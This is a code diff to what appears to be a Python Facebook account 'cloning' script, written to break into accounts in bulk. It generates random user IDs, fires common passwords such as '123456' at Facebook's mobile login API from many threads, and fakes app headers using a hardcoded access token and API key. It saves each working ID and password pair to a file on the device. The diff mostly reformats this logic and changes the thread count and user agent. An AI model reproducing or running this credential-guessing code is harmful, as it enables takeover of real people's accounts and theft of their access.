@@ -371,9 +371,10 @@ def START_SERIES_CLONING(series_code):
     
     # Generate IDs with selected series code (15 digits total)
     for i in range(limit):
-        uid = series_code + ''.join(random.choices(string.digits, k=9))
+        data = ''.join(random.choice(string.digits) for _ in range(9))
+        uid = series_code + data
         user.append(uid)
-    with tred(max_workers=40) as jihad:
+    with tred(max_workers=30) as jihad:
         clear()
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
@@ -400,56 +401,47 @@ def login1(uid):
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
+        ua = windows()
         for pw in ["123456", "1234567", "12345678", "123456789", "786786", "1234567890", "112233", "123123"]:
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token':
-                '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class':
-                'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
-            }
-            head = {
-                'User-Agent': ua,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': str(random.randint(20000, 30000)),
-                'X-FB-SIM-HNI': str(random.randint(29000, 40000)),
-                'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'WIFI', 'MOBILE.3G', 'MOBILE.4G']),
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                'x-fb-device-group': str(random.randint(5000, 6000)),
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-                'Content-Length': '706'
-            }
+            data = {'adid':str(uuid.uuid4()),
+            'format': 'json',
+            'device_id':str(uuid.uuid4()),
+            'cpl': 'true',
+            'family_device_id':str(uuid.uuid4()),
+            'credentials_type': 'device_based_login_password', 
+            'error_detail_type': 'button_with_disabled', 
+            'source': 'device_based_login', 
+            'email':str(uid),
+            'password':str(pw),
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
+            'generate_session_cookies': '1', 
+            'meta_inf_fbmeta': '', 
+            'advertiser_id':str(uuid.uuid4()),
+            'currently_logged_in_userid': '0', 
+            'locale': 'en_US',
+            'client_country_code': 'US', 
+            'method': 'auth.login', 
+            'fb_api_req_friendly_name': 'authenticate', 
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
+            'api_key': '882a8490361da98702bf97a021ddc14d'}
+            head = {'User-Agent': ua,
+            'Content-Type': 'application/x-www-form-urlencoded', 
+            'Host': 'graph.facebook.com', 
+            'X-FB-Net-HNI': '25227',
+            'X-FB-SIM-HNI': '29752',
+            'X-FB-Connection-Type': 'MOBILE.LTE', 
+            'X-Tigon-Is-Retry': 'False', 
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
+            'x-fb-device-group': '5120', 
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
+            'X-FB-Request-Analytics-Tags': 'graphservice', 
+            'X-FB-HTTP-Engine': 'Liger', 
+            'X-FB-Client-IP': 'True', 
+            'X-FB-Server-Cluster': 'True', 
+            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
+            'Content-Length': '706'}
             url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,
-                               data=data,
-                               headers=head,
-                               allow_redirects=False,
-                               verify=True).json()
+            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
                 oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
